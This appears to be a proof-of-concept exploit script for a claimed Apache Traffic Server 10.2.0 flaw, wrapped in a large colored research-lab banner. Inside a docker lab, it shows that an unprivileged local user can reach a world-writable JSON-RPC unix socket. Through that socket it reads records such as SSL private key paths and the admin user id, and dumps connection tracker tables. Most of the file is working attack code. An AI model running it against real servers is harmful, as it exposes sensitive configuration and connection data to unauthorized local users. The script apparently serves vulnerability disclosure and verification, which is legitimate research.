#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#  Mail    : abraxas.null@proton.me
#
#  CVE: ats-jsonrpc-unrestricted (High: 7.1)
#  Vendor: Apache Traffic Server (ASF)
#  Versions: Apache Traffic Server 10.2.0 (b1df7334)
#  Impact: World-connectable JSON-RPC UDS dumps records and tracker tuples
#  Requires: Local uid on the ATS host; JSON-RPC unix on
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "ats-jsonrpc-unrestricted"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL), ("Mail", _EMAIL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Prove ATS 10.2.0 JSON-RPC unix socket defaults to unrestricted 0777 recon."""


import json
import os
import subprocess
import time
import urllib.error
from dataclasses import dataclass
from pathlib import Path
from typing import Any
from urllib.request import Request, urlopen

LABEL = "ats-jsonrpc-unrestricted"
WITNESS = "ATS-JSONRPC-UNRESTRICTED-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", LABEL)
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
HTTP_PORT = 18720
SERVICE = "ats"
SOCK_PATH = "/opt/ats/var/trafficserver/jsonrpc20.sock"
LAB_UID = 10000
LAB_USER = "labuser"
ATS_USER = "nobody"
HTTP_TIMEOUT_S = 8.0
EXEC_TIMEOUT_S = 30


@dataclass(frozen=True)
class ExecResult:
    returncode: int
    stdout: str
    stderr: str


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 240) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = EXEC_TIMEOUT_S) -> ExecResult:
    proc = subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )
    return ExecResult(proc.returncode, proc.stdout or "", proc.stderr or "")


def exec_user(user: str, *argv: str, timeout: int = EXEC_TIMEOUT_S) -> ExecResult:
    return compose("exec", "-T", "-u", user, SERVICE, *argv, timeout=timeout)


def exec_script(user: str, script: str, timeout: int = EXEC_TIMEOUT_S) -> ExecResult:
    proc = subprocess.run(
        [
            "docker",
            "compose",
            "-p",
            COMPOSE_PROJECT,
            "exec",
            "-T",
            "-u",
            user,
            SERVICE,
            "python3",
            "-",
        ],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
        input=script,
    )
    return ExecResult(proc.returncode, proc.stdout or "", proc.stderr or "")


def http_get(url: str, host_header: str | None = None) -> tuple[int, str]:
    headers: dict[str, str] = {}
    if host_header is not None:
        headers["Host"] = host_header
    req = Request(url, headers=headers, method="GET")
    try:
        with urlopen(req, timeout=HTTP_TIMEOUT_S) as resp:
            body = resp.read().decode("utf-8", "replace")
            return int(resp.status), body
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace")
        return int(exc.code), body
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return 0, f"{type(exc).__name__}:{exc}"


def rpc_as(user: str, method: str, params: Any, req_id: str) -> dict[str, Any]:
    request = {"jsonrpc": "2.0", "id": req_id, "method": method}
    if params is not None:
        request["params"] = params
    payload = json.dumps(request, separators=(",", ":"))
    py = f"""
import json
import select
import socket
import sys

sock_path = {SOCK_PATH!r}
payload = {payload!r}
timeout_s = 5.0
client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
client.settimeout(timeout_s)
try:
    client.connect(sock_path)
    client.sendall(payload.encode("utf-8"))
    chunks = []
    while True:
        ready, _, _ = select.select([client], [], [], 1.0)
        if not ready:
            break
        data = client.recv(65536)
        if not data:
            break
        chunks.append(data)
        more, _, _ = select.select([client], [], [], 0.05)
        if not more:
            break
    raw = b"".join(chunks).decode("utf-8", "replace")
    sys.stdout.write(raw)
except Exception as exc:
    sys.stderr.write("RPC_ERROR %s:%s\\n" % (type(exc).__name__, exc))
    raise SystemExit(2)
finally:
    client.close()
"""
    result = exec_script(user, py)
    if result.returncode != 0:
        raise RuntimeError(
            f"rpc-{method}-rc={result.returncode} err={clip(result.stderr or result.stdout)}"
        )
    raw = result.stdout.strip()
    if not raw:
        raise RuntimeError(f"rpc-{method}-empty err={clip(result.stderr)}")
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError as exc:
        raise RuntimeError(f"rpc-{method}-not-json {clip(raw)}") from exc
    if not isinstance(parsed, dict):
        raise RuntimeError(f"rpc-{method}-not-object")
    return parsed


def record_values(body: dict[str, Any]) -> dict[str, str]:
    result = body.get("result")
    if not isinstance(result, dict):
        return {}
    records = result.get("recordList")
    if not isinstance(records, list):
        return {}
    out: dict[str, str] = {}
    for item in records:
        if not isinstance(item, dict):
            continue
        rec = item.get("record") if isinstance(item.get("record"), dict) else item
        if not isinstance(rec, dict):
            continue
        name = rec.get("record_name") or rec.get("name")
        value = rec.get("current_value")
        if isinstance(name, str) and value is not None:
            out[name] = str(value)
    return out


def error_blob(body: dict[str, Any]) -> str:
    err = body.get("error")
    if not isinstance(err, dict):
        return json.dumps(body, separators=(",", ":"))
    parts = [str(err.get("code", "")), str(err.get("message", ""))]
    data = err.get("data")
    if isinstance(data, list):
        for item in data:
            if isinstance(item, dict):
                parts.append(str(item.get("code", "")))
                parts.append(str(item.get("message", "")))
            else:
                parts.append(str(item))
    elif data is not None:
        parts.append(str(data))
    return " ".join(parts)


def tcp_listen_ports(service: str) -> list[int]:
    proc = compose("exec", "-T", SERVICE, "sh", "-c", "cat /proc/net/tcp /proc/net/tcp6 2>/dev/null || true")
    ports: list[int] = []
    for raw in proc.stdout.splitlines():
        line = raw.strip()
        if not line or line.startswith("sl"):
            continue
        parts = line.split()
        if len(parts) < 4 or parts[3] != "0A":
            continue
        local = parts[1]
        if ":" not in local:
            continue
        _, port_hex = local.split(":", 1)
        try:
            ports.append(int(port_hex, 16))
        except ValueError:
            continue
    unique: list[int] = []
    for port in ports:
        if port not in unique:
            unique.append(port)
    log(f"{service}-tcp-listen={unique}")
    return unique


def wait_http() -> tuple[int, str]:
    last = (0, "")
    for attempt in range(1, 61):
        last = http_get(f"http://{HOST}:{HTTP_PORT}/", host_header="127.0.0.1:8080")
        if last[0] == 200 and WITNESS in last[1]:
            log(f"http-ready attempt={attempt} status={last[0]}")
            return last
        log(f"http-wait attempt={attempt} status={last[0]} body={clip(last[1])!r}")
        time.sleep(2)
    return last


def wait_socket() -> str:
    last = ""
    for attempt in range(1, 31):
        proc = exec_user(LAB_USER, "stat", "-c", "%a %u %U %n", SOCK_PATH)
        last = (proc.stdout or proc.stderr).strip()
        if proc.returncode == 0 and last:
            log(f"sock-stat attempt={attempt} {last}")
            return last
        log(f"sock-wait attempt={attempt} rc={proc.returncode} {clip(last)}")
        time.sleep(1)
    return last


def main() -> int:
    log(f"label={LABEL} target={HOST}:{HTTP_PORT} sock={SOCK_PATH} witness={WITNESS}")

    http_status, http_body = wait_http()
    if http_status != 200 or WITNESS not in http_body:
        return fail(f"http={http_status} body={clip(http_body)}")

    ident = exec_user(LAB_USER, "id", "-u")
    uid_text = ident.stdout.strip()
    log(f"labuser-id={uid_text!r} rc={ident.returncode}")
    if ident.returncode != 0 or uid_text != str(LAB_UID):
        return fail(f"labuser-uid={uid_text or 'none'} expected={LAB_UID}")

    ats_ident = exec_user(ATS_USER, "id", "-u")
    ats_uid = ats_ident.stdout.strip()
    log(f"ats-uid={ats_uid!r} rc={ats_ident.returncode}")
    if ats_ident.returncode != 0 or not ats_uid or ats_uid == str(LAB_UID):
        return fail(f"ats-uid={ats_uid or 'none'}")

    sock_stat = wait_socket()
    mode = sock_stat.split(" ", 1)[0] if sock_stat else ""
    if mode != "777":
        return fail(f"sock-mode={mode or 'none'} expected=777 stat={clip(sock_stat)}")

    plant = exec_user(
        ATS_USER,
        "/opt/ats/bin/traffic_ctl",
        "config",
        "set",
        "proxy.config.proxy_name",
        WITNESS,
        timeout=45,
    )
    log(f"plant-proxy-name rc={plant.returncode} out={clip(plant.stdout)!r} err={clip(plant.stderr)!r}")
    if plant.returncode != 0:
        return fail(f"plant-failed rc={plant.returncode} {clip(plant.stderr or plant.stdout)}")

    try:
        lookup = rpc_as(
            LAB_USER,
            "admin_lookup_records",
            [
                {"record_name": "proxy.config.proxy_name"},
                {"record_name": "proxy.config.ssl.server.private_key.path"},
                {"record_name": "proxy.config.ssl.client.private_key.path"},
                {"record_name": "proxy.config.admin.user_id"},
            ],
            "lookup-1",
        )
    except RuntimeError as exc:
        return fail(str(exc))
    log(f"lookup={clip(json.dumps(lookup, separators=(',', ':')))}")
    if "error" in lookup and "result" not in lookup:
        return fail(f"lookup-error {clip(error_blob(lookup))}")
    values = record_values(lookup)
    proxy_name = values.get("proxy.config.proxy_name", "")
    key_path = values.get("proxy.config.ssl.server.private_key.path", "")
    client_key_path = values.get("proxy.config.ssl.client.private_key.path", "")
    admin_user = values.get("proxy.config.admin.user_id", "")
    log(
        f"lookup-proxy_name={proxy_name!r} key_path={key_path!r} "
        f"client_key_path={client_key_path!r} admin_user={admin_user!r}"
    )
    if WITNESS not in proxy_name:
        return fail(f"lookup-missing-witness proxy_name={proxy_name!r}")
    if "/opt/ats/etc/trafficserver" not in key_path and "trafficserver" not in key_path:
        return fail(f"lookup-missing-ssl-key-path key_path={key_path!r}")

    try:
        tracker = rpc_as(
            LAB_USER,
            "get_connection_tracker_info",
            {"table": "both"},
            "tracker-1",
        )
    except RuntimeError as exc:
        return fail(str(exc))
    log(f"tracker={clip(json.dumps(tracker, separators=(',', ':')))}")
    if "error" in tracker and "result" not in tracker:
        return fail(f"tracker-error {clip(error_blob(tracker))}")
    tracker_result = tracker.get("result")
    if not isinstance(tracker_result, dict):
        return fail("tracker-missing-result")
    if "outbound" not in tracker_result and "inbound" not in tracker_result:
        return fail("tracker-missing-tables")

    try:
        denied = rpc_as(
            LAB_USER,
            "admin_config_set_records",
            [{"record_name": "proxy.config.proxy_name", "record_value": "should-fail"}],
            "set-1",
        )
    except RuntimeError as exc:
        return fail(str(exc))
    log(f"set-denied={clip(json.dumps(denied, separators=(',', ':')))}")
    denied_text = error_blob(denied).lower()
    if "error" not in denied:
        return fail("set-missing-error")
    if "unauthorized" not in denied_text and "permission" not in denied_text and "denied" not in denied_text:
        return fail(f"set-not-denied {clip(denied_text)}")

    try:
        still = rpc_as(
            LAB_USER,
            "admin_lookup_records",
            [{"record_name": "proxy.config.proxy_name"}],
            "lookup-2",
        )
    except RuntimeError as exc:
        return fail(str(exc))
    still_name = record_values(still).get("proxy.config.proxy_name", "")
    log(f"lookup-after-denied proxy_name={still_name!r}")
    if WITNESS not in still_name:
        return fail(f"proxy-name-changed-after-denied {still_name!r}")

    listens = tcp_listen_ports(SERVICE)
    if 8080 not in listens:
        return fail(f"http-not-listening listens={listens}")
    extra = [port for port in listens if port not in {8080, 18080}]
    log(f"tcp-listen={listens} extra={extra} jsonrpc=uds-only")

    log(
        f"SUCCESS {LABEL} how=uds-0777-unrestricted-jsonrpc uid={uid_text} "
        f"sock-mode=0777 lookup-proxy_name={WITNESS} "
        f"ssl-key-path={key_path} tracker=ok write=unauthorized "
        f"tcp-jsonrpc=absent {WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

